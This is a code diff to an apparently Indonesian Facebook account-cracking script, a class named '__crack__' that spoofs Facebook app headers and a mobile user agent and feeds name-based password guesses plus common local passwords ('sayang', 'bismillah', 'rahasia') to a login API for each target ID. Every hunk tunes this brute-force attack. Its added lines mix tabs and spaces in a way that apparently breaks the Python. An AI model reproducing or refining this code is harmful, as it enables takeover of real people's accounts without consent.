@@ -655,7 +655,7 @@ class __crack__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
-            user_agent = requests.get('https://raw.githubusercontent.com/royofficial/roy-rmbf/main/ua/ua.txt').text.strip()
+            user_agent = 'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501'
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                'x-fb-net-hni': str(random.randint(20000, 40000)), 
                'x-fb-connection-quality': 'EXCELLENT', 
@@ -699,7 +699,7 @@ class __crack__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
-            user_agent = requests.get('https://raw.githubusercontent.com/royofficial/roy-rmbf/main/ua/ua.txt').text.strip()
+            user_agent = 'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501'
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                'x-fb-net-hni': str(random.randint(20000, 40000)), 
                'x-fb-connection-quality': 'EXCELLENT', 
@@ -742,7 +742,7 @@ class __crack__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
-            user_agent = requests.get('https://raw.githubusercontent.com/royofficial/roy-rmbf/main/ua/ua.txt').text.strip()
+            user_agent = 'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501'
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                'x-fb-net-hni': str(random.randint(20000, 40000)), 
                'x-fb-connection-quality': 'EXCELLENT', 
@@ -793,32 +793,16 @@ class __crack__:
                     try:
                         bb = yntks.split('<=>')
                         xz = bb[1].split(' ')
-                        if len(xz) == 1:
+                        if len(xz) == 1 or len(xz) == 2 or len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
+				if len(xz[0]) <= 5:
                             	raimuuu = [
-                            	xz[0]+'123', xz[0]+'1235', 'sayang',
+					xz[0],
+                            		xz[0]+'123',
+					xz[0]+'1235',
                             ]
-                        elif len(xz) == 2:
-                        	raimuuu = [
-                        		xz[0]+'123', xz[0]+'12345', 'sayang',
-                        		xz[1]+'123', xz[1]+'12345', 
-                        	]
-                        elif len(xz) == 3:
-                        	raimuuu = [
-                        		xz[0]+'123', xz[0]+'12345', 'sayang',
-                        		xz[1]+'123', xz[1]+'12345',
-                        		xz[2]+'123', xz[2]+'12345',
-                        	]
-                        elif len(xz) == 4:
-                        	raimuuu = [
-                        		xz[0]+'123', xz[0]+'12345', 'sayang',
-                        		xz[1]+'123', xz[1]+'12345',
-                        		xz[2]+'123', xz[2]+'12345',
-                        		xz[3]+'123', xz[3]+'12345',
-                        	]
                         else:
                         	raimuuu = [
-                        		'bismillah', '123456'
-					'anjing'
+                        		'sayang', 'bismillah', 'rahasia', 'indonesia', 'cantik'
                         	]
                         __yayanXD__.submit(self.__api__, bb[0], raimuuu)
                     except:
